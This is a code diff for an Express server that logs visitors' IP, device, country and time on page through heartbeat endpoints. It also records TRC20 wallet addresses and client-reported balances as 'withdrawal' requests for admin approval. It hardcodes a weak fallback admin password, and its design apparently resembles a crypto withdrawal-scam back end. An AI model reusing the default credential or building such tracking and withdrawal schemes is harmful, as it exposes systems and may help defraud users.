@@ -9,9 +9,8 @@ const app = express();
 const PORT = process.env.PORT || 3000;
 
 app.set('trust proxy', true);
-
 app.use(cors());
-app.use(express.json());
+app.use(express.json({ limit: '1mb' }));
 app.use(express.static(path.join(__dirname, 'public')));
 
 const DATA_DIR = path.join(__dirname, 'data');
@@ -23,7 +22,8 @@ if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
 const DEFAULT_CONFIG = {
     adminPassword: process.env.ADMIN_PASSWORD || 'admin123456',
     dailyLimit: 1,
-    telegramLink: 'https://t.me/your_default_support'
+    telegramLink: 'https://t.me/your_default_support',
+    heartbeatInterval: 30
 };
 
 const readJson = (filePath, defaultVal = {}) => {
@@ -90,100 +90,209 @@ function detectCountry(ip, language) {
             try {
                 const geo = geoip.lookup(cleanIp);
                 if (geo && geo.country) return geo.country;
-            } catch (e) { console.warn('geoip lookup 失败:', e.message); }
+            } catch (e) { console.warn('geoip 失败:', e.message); }
         }
     }
     return guessCountryByLang(language);
 }
 
-// 判断该 IP 当天已经成功提现的次数（拒绝的不算）
-function countTodayByIp(ip) {
-    // 北京时间当天 00:00 对应的 UTC 时间戳
+function extractContext(req) {
+    const ip = req.ip || req.connection.remoteAddress || '';
+    const ua = req.headers['user-agent'] || '';
+    const parser = new UAParser(ua);
+    const browser = parser.getBrowser();
+    const os = parser.getOS();
+    return {
+        ip: ip,
+        ua: ua,
+        device: guessDevice(ua),
+        os: `${os.name || ''} ${os.version || ''}`.trim() || '未知系统',
+        browser: `${browser.name || ''} ${browser.version || ''}`.trim() || '未知浏览器'
+    };
+}
+
+function calcDuration(visitIso, endIso) {
+    if (!visitIso || !endIso) return 0;
+    const t1 = new Date(visitIso).getTime();
+    const t2 = new Date(endIso).getTime();
+    if (isNaN(t1) || isNaN(t2) || t2 < t1) return 0;
+    return Math.round((t2 - t1) / 1000);
+}
+
+// 当天该 IP 已提交次数（只算 pending/approved，被拒绝的不占次数）
+function countTodaySubmitted(ip) {
     const now = Date.now();
     const bjNow = now + 8 * 3600 * 1000;
     const bjMidnight = new Date(bjNow);
     bjMidnight.setUTCHours(0, 0, 0, 0);
     const utcMidnight = bjMidnight.getTime() - 8 * 3600 * 1000;
-
     return records.filter(r => {
         if (r.ip !== ip) return false;
-        const t = new Date(r.createdAt || r.time || 0).getTime();
+        if (!r.submit_time) return false;
+        const t = new Date(r.submit_time).getTime();
         if (isNaN(t) || t < utcMidnight) return false;
-        // 只统计"待审核"和"已通过"的，被拒绝的不占次数
-        const st = r.auditStatus || r.status || 'pending';
+        const st = r.auditStatus;
         return st === 'pending' || st === 'approved';
     }).length;
 }
 
-// ==================== 公共 API ====================
+// ==================== 访问会话 API ====================
 
+// 公开设置（前端进入即读，无需鉴权）
 app.get('/api/public-settings', (req, res) => {
-    res.json({ telegramLink: config.telegramLink || '' });
+    res.json({
+        telegramLink: config.telegramLink || '',
+        heartbeatInterval: Number(config.heartbeatInterval) || 30
+    });
 });
 
-// 前端提交 TRC20 记录 —— 带 IP 每日次数限制
-app.post('/api/records', (req, res) => {
+// 用户进入页面：创建一条新的访问记录
+app.post('/api/visit-start', (req, res) => {
     try {
-        const ip = req.ip || req.connection.remoteAddress || '';
-        const ua = req.headers['user-agent'] || '';
-
-        // ★ IP 每日次数限制校验
-        const used = countTodayByIp(ip);
-        const limit = Number(config.dailyLimit) || 1;
-        if (used >= limit) {
-            return res.status(429).json({
-                error: 'DAILY_LIMIT_REACHED',
-                used: used,
-                limit: limit
-            });
-        }
-
-        const parser = new UAParser(ua);
-        const browser = parser.getBrowser();
-        const os = parser.getOS();
-
+        const ctx = extractContext(req);
         const nowIso = new Date().toISOString();
         const body = req.body || {};
         const language = body.language || '';
-        const country = detectCountry(ip, language);
+        const country = detectCountry(ctx.ip, language);
+        const visitId = body.visitId || (Date.now() + '_' + Math.random().toString(36).slice(2, 8));
 
-        const newRecord = {
-            id: Date.now() + '_' + Math.random().toString(36).slice(2, 8),
-            address: body.address || '',
-            balance: body.balance || '0.00',
-            amount: body.balance || '0.00',
-            language: language,
-            ip: ip,
-            userAgent: ua,
-            device: guessDevice(ua),
-            os: `${os.name || ''} ${os.version || ''}`.trim() || '未知系统',
-            browser: `${browser.name || ''} ${browser.version || ''}`.trim() || '未知浏览器',
+        const record = {
+            id: visitId,
+            visitId: visitId,
+            ip: ctx.ip,
+            userAgent: ctx.ua,
+            device: ctx.device,
+            os: ctx.os,
+            browser: ctx.browser,
             country: country,
-            visit_time: body.visitTime || nowIso,
-            time: body.timestamp || nowIso,
-            visit_time_local: formatBeijingTime(body.visitTime || nowIso),
-            time_local: formatBeijingTime(body.timestamp || nowIso),
-            auditStatus: 'pending',
-            createdAt: body.timestamp || nowIso
+            language: language,
+
+            visit_time: nowIso,
+            visit_time_local: formatBeijingTime(nowIso),
+            submit_time: null,
+            submit_time_local: null,
+            leave_time: null,
+            leave_time_local: null,
+            last_heartbeat: nowIso,
+
+            duration: 0,
+
+            address: '',
+            balance: '0.00',
+            amount: '0.00',
+
+            status: 'visiting',       // visiting | left | pending | approved | rejected
+            auditStatus: null,
+
+            createdAt: nowIso
         };
 
-        records.push(newRecord);
+        records.push(record);
         writeJson(RECORDS_FILE, records);
 
-        res.json({ success: true, record: newRecord });
+        res.json({ success: true, id: visitId });
     } catch (e) {
-        console.error('保存记录失败:', e);
+        console.error('visit-start 失败:', e);
         res.status(500).json({ error: '保存失败' });
     }
 });
 
+// 心跳：更新 last_heartbeat
+app.post('/api/visit-heartbeat', (req, res) => {
+    try {
+        const { id } = req.body || {};
+        if (!id) return res.status(400).json({ error: '缺少 id' });
+        const rec = records.find(r => r.id === id);
+        if (!rec) return res.status(404).json({ error: '记录不存在' });
+        if (rec.leave_time) return res.json({ success: true, ended: true });
+        const nowIso = new Date().toISOString();
+        rec.last_heartbeat = nowIso;
+        // 只有未离开的情况下才刷新时长
+        rec.duration = calcDuration(rec.visit_time, nowIso);
+        writeJson(RECORDS_FILE, records);
+        res.json({ success: true });
+    } catch (e) {
+        res.status(500).json({ error: '失败' });
+    }
+});
+
+// 离开：更新 leave_time 和 duration
+app.post('/api/visit-end', (req, res) => {
+    try {
+        const { id } = req.body || {};
+        if (!id) return res.status(400).json({ error: '缺少 id' });
+        const rec = records.find(r => r.id === id);
+        if (!rec) return res.status(404).json({ error: '记录不存在' });
+        if (rec.leave_time) return res.json({ success: true });
+        const nowIso = new Date().toISOString();
+        rec.leave_time = nowIso;
+        rec.leave_time_local = formatBeijingTime(nowIso);
+        rec.duration = calcDuration(rec.visit_time, nowIso);
+        if (rec.status === 'visiting') rec.status = 'left';
+        writeJson(RECORDS_FILE, records);
+        res.json({ success: true });
+    } catch (e) {
+        res.status(500).json({ error: '失败' });
+    }
+});
+
+// 提交提现：更新已有访问记录，补上 address / amount / submit_time
+app.post('/api/records', (req, res) => {
+    try {
+        const ctx = extractContext(req);
+        const body = req.body || {};
+        const { id } = body;
+
+        // ★ IP 每日次数限制（先检查）
+        const used = countTodaySubmitted(ctx.ip);
+        const limit = Number(config.dailyLimit) || 1;
+        if (used >= limit) {
+            return res.status(429).json({ error: 'DAILY_LIMIT_REACHED', used: used, limit: limit });
+        }
+
+        if (!id) return res.status(400).json({ error: '缺少访问记录 id' });
+        const rec = records.find(r => r.id === id);
+        if (!rec) return res.status(404).json({ error: '访问记录不存在' });
+        if (rec.auditStatus === 'pending' || rec.auditStatus === 'approved' || rec.auditStatus === 'rejected') {
+            return res.status(409).json({ error: 'ALREADY_SUBMITTED' });
+        }
+
+        const nowIso = new Date().toISOString();
+        const language = body.language || rec.language || '';
+        rec.address = body.address || '';
+        rec.balance = body.balance || '0.00';
+        rec.amount = body.balance || '0.00';
+        rec.language = language;
+        rec.country = detectCountry(ctx.ip, language) || rec.country;
+        rec.submit_time = nowIso;
+        rec.submit_time_local = formatBeijingTime(nowIso);
+        rec.status = 'pending';
+        rec.auditStatus = 'pending';
+        if (!rec.leave_time) {
+            rec.last_heartbeat = nowIso;
+            rec.duration = calcDuration(rec.visit_time, nowIso);
+        }
+
+        writeJson(RECORDS_FILE, records);
+        res.json({ success: true, record: rec });
+    } catch (e) {
+        console.error('提交失败:', e);
+        res.status(500).json({ error: '保存失败' });
+    }
+});
+
+// 后台获取所有记录
 app.get('/api/records', authenticateToken, (req, res) => {
     res.json({ records: records.slice().reverse() });
 });
 
+// 前端查询自己 IP 的提现记录（只返回提交过的）
 app.get('/api/my-withdrawals', (req, res) => {
     const ip = req.ip || req.connection.remoteAddress || '';
-    const mine = records.filter(r => r.ip === ip).slice(-10).reverse();
+    const mine = records
+        .filter(r => r.ip === ip && r.submit_time)
+        .slice(-10)
+        .reverse();
     res.json(mine);
 });
 
@@ -210,6 +319,7 @@ app.post('/api/audit', authenticateToken, (req, res) => {
         return res.status(409).json({ error: '该记录已审核' });
     }
     rec.auditStatus = finalStatus;
+    rec.status = finalStatus;
     rec.auditedAt = new Date().toISOString();
     writeJson(RECORDS_FILE, records);
     res.json({ success: true });
@@ -225,26 +335,36 @@ app.post('/api/audit-batch', authenticateToken, (req, res) => {
         const rec = records.find(r => String(r.id) === String(id));
         if (!rec) { skipped++; return; }
         if (rec.auditStatus === 'approved' || rec.auditStatus === 'rejected') { skipped++; return; }
+        if (!rec.submit_time) { skipped++; return; } // 未提交的不能审核
         rec.auditStatus = finalStatus;
+        rec.status = finalStatus;
         rec.auditedAt = new Date().toISOString();
         updated++;
     });
     writeJson(RECORDS_FILE, records);
-    res.json({ success: true, updated, skipped });
+    res.json({ success: true, updated: updated, skipped: skipped });
 });
 
 app.get('/api/config', authenticateToken, (req, res) => {
     res.json({
         dailyLimit: config.dailyLimit,
-        telegramLink: config.telegramLink || ''
+        telegramLink: config.telegramLink || '',
+        heartbeatInterval: Number(config.heartbeatInterval) || 30
     });
 });
 
 app.post('/api/config', authenticateToken, (req, res) => {
-    const { dailyLimit } = req.body || {};
-    const v = parseInt(dailyLimit, 10);
-    if (isNaN(v) || v < 1 || v > 100) return res.status(400).json({ error: '限制必须在 1-100' });
-    config.dailyLimit = v;
+    const body = req.body || {};
+    if (body.dailyLimit !== undefined) {
+        const v = parseInt(body.dailyLimit, 10);
+        if (isNaN(v) || v < 1 || v > 100) return res.status(400).json({ error: '提现次数必须在 1-100' });
+        config.dailyLimit = v;
+    }
+    if (body.heartbeatInterval !== undefined) {
+        const h = parseInt(body.heartbeatInterval, 10);
+        if (isNaN(h) || h < 5 || h > 300) return res.status(400).json({ error: '心跳间隔必须在 5-300 秒' });
+        config.heartbeatInterval = h;
+    }
     writeJson(CONFIG_FILE, config);
     res.json({ success: true });
 });
